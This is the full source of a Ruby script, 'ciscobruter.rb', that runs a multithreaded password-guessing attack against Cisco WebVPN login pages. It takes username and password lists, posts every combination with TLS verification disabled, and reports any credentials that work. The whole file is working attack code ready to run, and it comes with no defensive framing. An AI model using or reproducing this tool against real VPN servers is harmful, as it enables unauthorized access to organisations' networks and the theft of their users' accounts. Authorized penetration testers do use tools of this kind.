#!/usr/bin/env ruby
require 'pry'
require 'net/https'
require 'optparse'
require 'celluloid/current'
require 'thread/pool'
require 'ruby-progressbar'
include Celluloid::Internals::Logger


options = {}
args = OptionParser.new do |opts|
  opts.banner = "ciscobruter.rb VERSION: 1.0.0 - UPDATED: 01/20/2016\r\n\r\n"
  opts.on("-u", "--username   [Username]", "\tUsername to guess passwords against") { |username| options[:usernames] = [username] }
  opts.on("-p", "--password   [Password]", "\tPassword to try with username") { |password| options[:passwords] = [password] }
  opts.on("-U", "--user-file  [File Path]", "\tFile containing list of usernames") { |usernames| options[:usernames] = File.open(usernames, 'r').read.split("\n") }
  opts.on("-P", "--pass-file  [File Path]", "\tFile containing list of passwords") { |passwords| options[:passwords] = File.open(passwords, 'r').read.split("\n") }
  opts.on("-t", "--target     [URL]", "\tTarget VPN server example: https://vpn.target.com") { |target| options[:target] = target }
  opts.on("-l", "--login-path [Login Path]", "\tPath to login page.  Default: /+webvpn+/index.html") { |path| options[:path] = path }
  opts.on("-g", "--group      [Group Name]", "\tGroup name for VPN.  Default: No Group") { |group| options[:group] = group }
  opts.on("-v", "--verbose", "\tEnables verbose output\r\n\r\n") { |v| options[:verbose] = true }
end


begin
	args.parse!(ARGV)
	mandatory = [:target]
	missing = mandatory.select{ |param| options[param].nil? }
	unless missing.empty?
		warn "Error.  Missing required options: #{missing.join(', ')}"
		puts args
		exit!
	end 
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	puts $!.to_s
	exit!
end


class Ciscobruter

	attr_accessor :uri, :http, :headers, :verbose, :path, :group

	def initialize(target, verbose=nil, login=nil, group=nil)
		self.uri = URI.parse(target)
		self.path = set_path(login)
		self.group = group
		self.http = setup_http
		self.headers = { 'Cookie' => 'webvpnlogin=1; webvpnLang=en' }
		self.verbose = verbose
	end

	def try_credentials(username, password)
		info "Trying username: #{username} and password: #{password} on #{uri.host}" if verbose
		post = "username=#{username}&password=#{password}"

		if group != nil
			post += "&group_list=#{group}"
		end

		response = http.post(path, post, headers)
		if response.code == "200"
			if validate_credentials(response.body)
				report_creds(username, password)
			end
		elsif response.code == "302"
			warn "Error. #{path} not valid."
		end
		return
	end

	private

		def set_path(login)
			return login.nil? ? '/+webvpn+/index.html' : login
		end

		def setup_http
			http = Net::HTTP.new(uri.host, uri.port)
			http.use_ssl = true
			http.verify_mode = OpenSSL::SSL::VERIFY_NONE
			return http
		end

		def validate_credentials(html)
			return html !~ /document.location.replace/
		end

		def report_creds(user, pass)
			warn "CREDENTIALS FOUND! username: #{user} password: #{pass}"
		end

end


def main(options, total)
	threads = Thread.pool(100)
	info "Trying #{total} username/password combinations..."
	options[:usernames].each do |username|
		options[:passwords].each do |password|
			threads.process {
				bruter = Ciscobruter.new(options[:target], options[:verbose], options[:path], options[:group])
				bruter.try_credentials(username.chomp, password.chomp)
				PROGRESS.increment
			}
		end
	end
	threads.shutdown
end


total = options[:usernames].count * options[:passwords].count
PROGRESS = ProgressBar.create(format: "%a %e %P% Processed: %c from %C", total: total)
main(options, total)

